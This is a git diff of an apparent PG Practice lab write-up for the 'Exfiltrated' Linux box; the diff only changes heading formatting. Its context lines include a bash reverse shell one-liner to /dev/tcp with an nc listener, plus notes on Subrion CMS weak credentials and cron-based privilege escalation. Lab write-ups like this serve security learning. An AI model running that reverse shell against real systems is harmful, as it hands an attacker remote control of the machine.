@@ -11,7 +11,7 @@ draft: false
 ---
 # Exfiltrated - Easy - Linux - PG Practice
 
-# *Scanning*
+# **Scanning**
 
 My basic scan runs the following command
 ```bash
@@ -66,7 +66,7 @@ Nmap done: 1 IP address (1 host up) scanned in 13.04 seconds
 
 	This shows the platform is running `Subrion CMS 4.2`
 
-# *Exploitation*
+# **Exploitation**
 
 #### **Subrion Weak Credentials**
 
@@ -127,7 +127,7 @@ Using revshells.com to make a bash reverse shell and catch it using `nc`
 $ bash -c "bash -i >& /dev/tcp/$IP/$PORT 0>&1"
 ```
 
-# *Privilege Escalation*
+# **Privilege Escalation**
 Checking the crontab shows us the following sus file running as root.
 ```bash
 ┌──(kali㉿kali)-[~/…/PGPractice/Easy/Linux/Exfiltrated]
